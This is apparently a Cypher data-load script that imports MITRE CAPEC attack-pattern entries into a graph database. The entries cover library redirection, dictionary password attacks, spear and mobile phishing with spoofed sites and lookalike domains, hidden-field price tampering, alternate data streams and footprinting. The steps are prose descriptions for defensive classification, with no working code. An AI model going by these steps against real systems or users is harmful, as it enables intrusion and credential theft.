CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker uses a tool such as the OSX \"otool\" utility or manually probes whether the target application uses dynamically linked libraries.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker finds the configuration files containing the entries to the dynamically linked libraries and modifies the entries to point to the malicious libraries the attacker crafted.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The target application uses dynamically linked libraries.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The attacker can redirect or control access to files in areas leveraged by the target.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The attacker can modify the entries in the configuration files to the libraries the attacker crafted.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The attacker cannot modify the configuration files entries. The attacker may still be able to redirect access to libraries using other techniques such as using symbolic links.</p>\n</div>"});
CREATE (:Indicator{id: 5, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">The application does not use dynamically linked libraries.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker can successfully redirect or control access to libraries leveraged by the target."});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker identifies and gains control of the configuration file containing entries of a list of dynamically linked libraries and be able to modify the entry to point to the malicious libraries the attacker created."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Craft malicious libraries", description: "<div level=\"0\">\n  <p class=\"text\">The attacker uses knowledge gained in the Explore phase to craft malicious libraries that he will redirect the target to leverage. These malicious libraries could have the same APIs as the legitimate library and additional malicious code.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the attacker can delay the operations by using \"sleep(2)\" and \"usleep()\" to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The entries in the configuration file points to the malicious libraries he crafted."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Redirect the access to libraries to the malicious libraries", description: "<div level=\"0\">\n  <p class=\"text\">The attacker redirects the target to the malicious libraries he crafted in the Experiment phase. The attacker will be able to force the targeted application to execute arbitrary code when the application attempts to access the legitimate libraries.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker modifies the entries in the configuration files pointing to the malicious libraries he crafted.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker leverages symlink/timing issues to redirect the target to access the malicious libraries he crafted.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">The attacker leverages file search path order issues to redirect the target to access the malicious libraries he crafted.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The application is redirected to the malicious libraries the attacker crafted when the application attempts to call the legitimate libraries."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
MERGE (:Reference{id: "REF-11", local_id: "R.159.1", author: "Silvio Cesare", title: "Share Library Call Redirection Via ELF PLT Infection", pubdate: "2000", link: "http://www.phrack.org/issues.html?issue=56&id=7"});
MERGE (:Reference{id: "REF-8", local_id: "R.159.2", title: "OWASP Top 10", section: "Top 10 2007 - Malicious File Execution", publisher: "The Open Web Application Security Project (OWASP)", link: "https://www.owasp.org/index.php/Top_10_2007-A3"});
MERGE (:Reference{local_id: "R.159.3", author: "ATT&CK Project", title: "Path Interception (1034)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Path_interception"});
MERGE (:CWE{id: 714});
CREATE (:AttackPattern{id: 16, name: "Dictionary-based Password Attack", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 106, text: "<div level=\"0\">\n  <p class=\"text\">The system uses one factor password based authentication.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 107, text: "<div level=\"0\">\n  <p class=\"text\">The system does not have a sound password policy that is being enforced.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 108, text: "<div level=\"0\">\n  <p class=\"text\">The system does not implement an effective password throttling mechanism.</p>\n</div>"});
CREATE (:Submission{id: 136});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 136, summary: "OrderedDict([('Text', \"An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Determine application's/system's password policy", description: "<div level=\"0\">\n  <p class=\"text\">Determine the password policies of the target application/system.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Determine minimum and maximum allowed password lengths.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Passwords are used in the application/system</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Passwords are not used in the application/system.</p>\n</div>"});
CREATE (:AttackStep{id: 2, title: "Select dictionaries", description: "<div level=\"0\">\n  <p class=\"text\">Pick the dictionaries to be used in the attack (e.g. different languages, specific terminology, etc.)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Select dictionary based on particular users' preferred languages.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Select dictionary based on the application/system's supported languages.</p>\n</div>"});
CREATE (:AttackStep{id: 3, title: "Determine username(s) to target", description: "<div level=\"0\">\n  <p class=\"text\">Determine username(s) whose passwords to crack.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Obtain username(s) by sniffing network packets.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Obtain username(s) by querying application/system (e.g. if upon a failed login attempt, the system indicates whether the entered username was valid or not)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Obtain usernames from filesystem (e.g. list of directories in C:\\Documents and Settings\\ in Windows, and list in /etc/passwd in UNIX-like systems)</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Remote application or system provides no indication regarding whether a given username is valid or not.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "At least one valid username found."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Presence of any valid usernames could not be established."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Corrective"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Use dictionary to crack passwords.", description: "<div level=\"0\">\n  <p class=\"text\">Use a password cracking tool that will leverage the dictionary to feed passwords to the system and see if they work.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Try all words in the dictionary, as well as common misspellings of the words as passwords for the chosen username(s).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Try common combinations of words in the dictionary, as well as common misspellings of the combinations as passwords for the chosen username(s).</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Application/system does not use password authentication.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker determines correct password for a user ID and obtains access to application or system."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Attacker is unable to determine correct password for a user ID and obtain access to application or system."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
MERGE (:CWE{id: 521});
MERGE (:CWE{id: 262});
MERGE (:CWE{id: 263});
MERGE (:CWE{id: 693});
CREATE (:ResourcesRequired{id: 60, text: "<div level=\"0\">\n  <p class=\"text\">A machine with sufficient resources for the job (e.g. CPU, RAM, HD). Applicable dictionaries are required. Also a password cracking tool or a custom script that leverages the dictionary database to launch the attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 160, name: "Exploit Script-Based APIs", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 109, text: "<div level=\"0\">\n  <p class=\"text\">The target application must include the use of APIs that execute scripts.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 110, text: "<div level=\"0\">\n  <p class=\"text\">The target application must allow the attacker to provide some or all of the arguments to one of these script interpretation methods and must fail to adequately filter these arguments for dangerous or unwanted script commands.</p>\n</div>"});
CREATE (:Submission{id: 137});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 103});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Description Summary"});
CREATE (:PreviousEntryName{id: 25, name: "Programming to included script-based APIs"});
MERGE (:Date{date: "2015-12-07"});
CREATE (:Description{id: 137, summary: "OrderedDict([('Text', 'Some APIs support scripting instructions as arguments. Methods that take scripted instructions (or references to scripted instructions) can be very flexible and powerful. However, if an attacker can specify the script that serves as input to these methods they can gain access to a great deal of functionality. For example, HTML pages support <script> tags that allow scripting languages to be embedded in the page and then interpreted by the receiving web browser. If the content provider is malicious, these scripts can compromise the client application. Some applications may even execute the scripts under their own identity (rather than the identity of the user providing the script) which can allow attackers to perform activities that would otherwise be denied to them.')])"});
CREATE (:ResourcesRequired{id: 61, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have the ability to write a script and submit it to the appropriate API method in the target application.</p>\n</div>"});
CREATE (:AttackPattern{id: 161, name: "Infrastructure Manipulation", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 111, text: "<div level=\"0\">\n  <p class=\"text\">The targeted client must access the site via infrastructure that the attacker has co-opted and must fail to adequately verify that the communication channel is operating correctly (e.g. by verifying that they are, in fact, connected to the site they intended.)</p>\n</div>"});
CREATE (:Submission{id: 138});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 104});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 138, summary: "OrderedDict([('Text', \"An attacker exploits characteristics of the infrastructure of a network entity in order to perpetrate attacks or information gathering on network objects or effect a change in the ordinary information flow between network objects. Most often, this involves manipulation of the routing of network messages so, instead of arriving at their proper destination, they are directed towards an entity of the attackers' choosing, usually a server controlled by the attacker. The victim is often unaware that their messages are not being processed correctly. For example, a targeted client may believe they are connecting to their own bank but, in fact, be connecting to a Pharming site controlled by the attacker which then collects the user's login information in order to hijack the actual bank account.\")])"});
CREATE (:ResourcesRequired{id: 62, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to corrupt the infrastructure used by the client. For some variants of this attack, the attacker must be able to stand up their own services that mimic the services the targeted client intends to use.</p>\n</div>"});
CREATE (:AttackPattern{id: 162, name: "Manipulating Hidden Fields", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 112, text: "<div level=\"0\">\n  <p class=\"text\">The targeted merchant site must use a shopping cart that does not obfuscate the transaction data and does not validate pricing with back end processing.</p>\n</div>"});
CREATE (:Submission{id: 139});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 105});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 106});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 26, name: "Manipulating hidden fields to change the normal flow of transactions (eShoplifting)"});
MERGE (:Date{date: "2015-12-07"});
CREATE (:Description{id: 139, summary: "OrderedDict([('Text', \"An attacker exploits a weakness in the server's trust of client-side processing by modifying data on the client-side, such as price information, and then submitting this data to the server to effect a change in the state of an ordinary transaction. eShoplifting is a data manipulation attack against an on-line merchant during a purchasing transaction. The manipulation of price, discount or quantity fields in the transaction message allows the attacker to acquire items at a lower cost than the merchant intended. The attacker performs a normal purchasing transaction but edits hidden fields within the HTML form response that store price or other information to give themselves a better deal. The merchant then uses the modified pricing information in calculating the cost of the selected items.\")])"});
MERGE (:CWE{id: 602});
CREATE (:ResourcesRequired{id: 63, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to craft HTTP responses to the target's shopping site.</p>\n</div>"});
CREATE (:AttackPattern{id: 163, name: "Spear Phishing", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 113, text: "<div level=\"0\">\n  <p class=\"text\">None. Any user can be targeted by a Spear Phishing attack.</p>\n</div>"});
CREATE (:Submission{id: 140});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 107});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 140, summary: "OrderedDict([('Text', 'An attacker targets a specific user or group with a Phishing (CAPEC-98) attack tailored to a category of users in order to have maximum relevance and deceptive capability. Spear Phishing is an enhanced version of the Phishing attack targeted to a specific user or group. The quality of the targeted email is usually enhanced by appearing to come from a known or trusted entity. If the email account of some trusted entity has been compromised the message may be digitally signed. The message will contain information specific to the targeted users that will enhance the probability that they will follow the URL to the compromised site. For example, the message may indicate knowledge of the targets employment, residence, interests, or other information that suggests familiarity. As soon as the user follows the instructions in the message, the attack proceeds as a standard Phishing attack.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Obtain useful contextual detailed information about the targeted user or organization", description: "<div level=\"0\">\n  <p class=\"text\">An attacker collects useful contextual detailed information about the targeted user or organization in order to craft a more deceptive and enticing message to lure the target into responding.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Conduct web searching research of target.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Identify trusted associates, colleagues and friends of target.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Utilize social engineering attack patterns such as Pretexting.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Collect social information via dumpster diving.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 5, description: "<div level=\"0\">\n  <p class=\"text\">Collect social information via traditional sources.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 6, description: "<div level=\"0\">\n  <p class=\"text\">Collect social information via Non-traditional sources.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Optional: Obtain domain name and certificate to spoof legitimate site", description: "<div level=\"0\">\n  <p class=\"text\">This optional step can be used to help the attacker impersonate the legitimate site more convincingly. The attacker can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Optionally obtain a legitimate SSL certificate for the new domain name.</p>\n</div>"});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Optional: Explore legitimate website and create duplicate", description: "<div level=\"0\">\n  <p class=\"text\">An attacker creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that he or she is trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use spidering software to get copy of web pages on legitimate site.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Manually save copies of required web pages from legitimate site.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Create new web pages that have the legitimate site's look at feel, but contain completely new content.</p>\n</div>"});
CREATE (:AttackStep{id: 3, title: "Optional: Build variants of the website with very specific user information e.g., living area, etc.", description: "<div level=\"0\">\n  <p class=\"text\">Once the attacker has his website which duplicates a legitimate website, he needs to build very custom user related information in it. For example, he could create multiple variants of the website which would target different living area users by providing information such as local news, local weather, etc. so that the user believes this is a new feature from the website.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Integrate localized information in the web pages created to duplicate the original website. Those localized information could be dynamically generated based on unique key or IP address of the future victim.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Convince user to enter sensitive information on attacker's site.", description: "<div level=\"0\">\n  <p class=\"text\">An attacker sends a message (typically an e-mail) to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to attacker's website) and log in. The key is to get the victim to believe that the message is coming from a legitimate entity trusted by the victim or with which the victim or does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Place phishing link in post to online forum.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Legitimate user clicks on link supplied by attacker and enters the requested information."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Legitimate user realizes that the e-mail is not legitimate, or that the attackers' website is not legitimate, and therefore, does not enter the information requested by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackStep{id: 2, title: "Use stolen credentials to log into legitimate site", description: "<div level=\"0\">\n  <p class=\"text\">Once the attacker captures some sensitive information through phishing (login credentials, credit card information, etc.) the attacker can leverage this information. For instance, the attacker can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Log in to the legitimate site using another user's supplied credentials.</p>\n</div>"});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:ResourcesRequired{id: 64, text: "<div level=\"0\">\n  <p class=\"text\">Some web development tools to put up a fake website.</p>\n</div>"});
CREATE (:AttackPattern{id: 164, name: "Mobile Phishing", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AlternateTerm{id: 2, term: "MobPhishing"});
CREATE (:AttackPrerequisite{id: 114, text: "<div level=\"0\">\n  <p class=\"text\">Attacker needs mobile phone numbers to initiate the connection. The attacker must guess an area of interest for the mobile user to entice them to follow the link provided in the text message. The attacker must have a replicated web site as in a normal Phishing attack.</p>\n</div>"});
CREATE (:Submission{id: 141});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 108});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Alternate_Terms"});
CREATE (:PreviousEntryName{id: 27, name: "Mobile Phishing (aka MobPhishing)"});
MERGE (:Date{date: "2017-01-09"});
CREATE (:Description{id: 141, summary: "OrderedDict([('Text', 'An attacker targets mobile phone users with a phishing attack for the purpose of soliciting account passwords or sensitive information from the user. Mobile Phishing is a variation on the Phishing social engineering technique where the attack is initiated via mobile texting rather than email. The user is enticed to provide information or go to a compromised web site via a text message. Apart from the manner in which the attack is initiated, the attack proceeds as a standard Phishing attack.')])"});
CREATE (:ResourcesRequired{id: 65, text: "<div level=\"0\">\n  <p class=\"text\">Either mobile phone or access to a web resource that allows text messages to be sent to mobile phones. Resources needed for regular Phishing attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 165, name: "File Manipulation", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 115, text: "<div level=\"0\">\n  <p class=\"text\">The target must use the affected file without verifying its integrity.</p>\n</div>"});
CREATE (:Submission{id: 142});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 109});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 142, summary: "OrderedDict([('Text', \"An attacker modifies file contents or attributes (such as extensions or names) of files in a manner to cause incorrect processing by an application. Attackers use this class of attacks to cause applications to enter unstable states, overwrite or expose sensitive information, and even execute arbitrary code with the application's privileges. This class of attacks differs from attacks on configuration information (even if file-based) in that file manipulation causes the file processing to result in non-standard behaviors, such as buffer overflows or use of the incorrect interpreter. Configuration attacks rely on the application interpreting files correctly in order to insert harmful configuration information. Likewise, resource location attacks rely on controlling an application's ability to locate files, whereas File Manipulation attacks do not require the application to look in a non-default location, although the two classes of attacks are often combined.\")])"});
CREATE (:ResourcesRequired{id: 66, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required for most variants of this attack. In some cases, tools are needed to better control the response of the targeted application to the modified file.</p>\n</div>"});
CREATE (:AttackPattern{id: 166, name: "Force the System to Reset Values", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 116, text: "<div level=\"0\">\n  <p class=\"text\">The targeted application must have a reset function that returns the configuration of the application to an earlier state.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 117, text: "<div level=\"0\">\n  <p class=\"text\">The reset functionality must be inadequately protected against use.</p>\n</div>"});
CREATE (:Submission{id: 143});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 110});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 143, summary: "OrderedDict([('Text', \"An attacker forces the target into a previous state in order to leverage potential weaknesses in the target dependent upon a prior configuration or state-dependent factors. Even in cases where an attacker may not be able to directly control the configuration of the targeted application, they may be able to reset the configuration to a prior state since many applications implement reset functions. Since these functions are usually intended as emergency features to return an application to a stable configuration if the current configuration degrades functionality, they may not be as strongly secured as other configuration options. The resetting of values is dangerous as it may enable undesired functionality, disable services, or modify access controls. At the very least this is a nuisance attack since the administrator will need to re-apply their configuration. At worst, this attack can open avenues for powerful attacks against the application, and, if it isn't obvious that the configuration has been reset, these vulnerabilities may be present a long time before they are notices.\")])"});
CREATE (:ResourcesRequired{id: 67, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required for execution of this attack. In some cases, the attacker may need special client applications or a given level of access to the application in order to execute the reset functionality.</p>\n</div>"});
CREATE (:AttackPattern{id: 167, name: "White Box Reverse Engineering", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 118, text: "<div level=\"0\">\n  <p class=\"text\">Direct access to the object or software.</p>\n</div>"});
CREATE (:Submission{id: 144});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 111});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Activation_Zone, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required"});
CREATE (:PreviousEntryName{id: 28, name: "Lifting Sensitive Data from the Client"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 144, summary: "OrderedDict([('Text', 'An attacker discovers the structure, function, and composition of a type of computer software through white box analysis techniques. White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution.')])"});
CREATE (:ResourcesRequired{id: 68, text: "<div level=\"0\">\n  <p class=\"text\">Reverse engineering of software requires varying tools and methods that enable the decompiling of executable or other compiled objects.</p>\n</div>"});
CREATE (:AttackPattern{id: 168, name: "Windows ::DATA Alternate Data Stream", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 119, text: "<div level=\"0\">\n  <p class=\"text\">The target must be running the Microsoft NTFS file system.</p>\n</div>"});
CREATE (:Submission{id: 145});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 145, summary: "OrderedDict([('Text', 'An attacker exploits the functionality of Microsoft NTFS Alternate Data Streams (ADS) to undermine system security. ADS allows multiple \"files\" to be stored in one directory entry referenced as filename:streamname. One or more alternate data streams may be stored in any file or directory. Normal Microsoft utilities do not show the presence of an ADS stream attached to a file. The additional space for the ADS is not recorded in the displayed file size. The additional space for ADS is accounted for in the used space on the volume. An ADS can be any type of file. ADS are copied by standard Microsoft utilities between NTFS volumes. ADS can be used by an attacker or intruder to hide tools, scripts, and data from detection by normal system utilities. Many anti-virus programs do not check for or scan ADS. Windows Vista does have a switch (-R) on the command line DIR command that will display alternate streams.')])"});
MERGE (:CWE{id: 212});
MERGE (:CWE{id: 69});
CREATE (:ResourcesRequired{id: 69, text: "<div level=\"0\">\n  <p class=\"text\">No special tools or resources are required. The attacker must have command line or programmatic access to the target's files system with write/read permissions.</p>\n</div>"});
CREATE (:AttackPattern{id: 169, name: "Footprinting", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 120, text: "<div level=\"0\">\n  <p class=\"text\">An application must publicize identifiable information about the system or application through voluntary or involuntary means. Certain identification details of information systems are visible on communication networks (e.g., if an adversary uses a sniffer to inspect the traffic) due to their inherent structure and protocol standards. Any system or network that can be detected can be footprinted. However, some configuration choices may limit the useful information that can be collected during a footprinting attack.</p>\n</div>"});
CREATE (:Submission{id: 146});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 112});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 146, summary: "OrderedDict([('Text', 'An adversary engages in probing and exploration activities to identify constituents and properties of the target. Footprinting is a general term to describe a variety of information gathering techniques, often used by attackers in preparation for some attack. It consists of using tools to learn as much as possible about the composition, configuration, and security mechanisms of the targeted application, system or network. Information that might be collected during a footprinting effort could include open ports, applications and their versions, network topology, and similar information. While footprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
